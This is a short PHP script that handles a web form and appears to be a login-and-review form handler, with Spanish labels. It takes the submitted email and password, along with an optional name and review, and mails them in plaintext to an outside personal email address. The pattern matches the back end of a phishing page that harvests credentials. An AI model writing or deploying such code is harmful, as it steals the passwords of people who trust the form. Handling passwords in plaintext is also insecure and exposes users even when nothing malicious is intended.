<?php
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $email = $_POST["email"];
    $password = isset($_POST["password"]) ? $_POST["password"] : null;
    $name = isset($_POST["name"]) ? $_POST["name"] : "Anónimo";
    $review = isset($_POST["review"]) ? $_POST["review"] : null;

    $to = "aescalona970@gmail.com"; // Tu correo de destino
    $subject = "Nuevo Inicio de Sesión o Reseña";

    $message = "Correo: $email\n";
    
    if ($password) {
        $message .= "Contraseña: $password\n";
    }
    
    if ($review) {
        $message .= "Nombre: $name\nReseña:\n$review";
    }

    $headers = "From: noreply@tuweb.com";

    if (mail($to, $subject, $message, $headers)) {
        echo "Correo enviado correctamente.";
    } else {
        echo "Hubo un error al enviar el correo.";
    }
}
?>
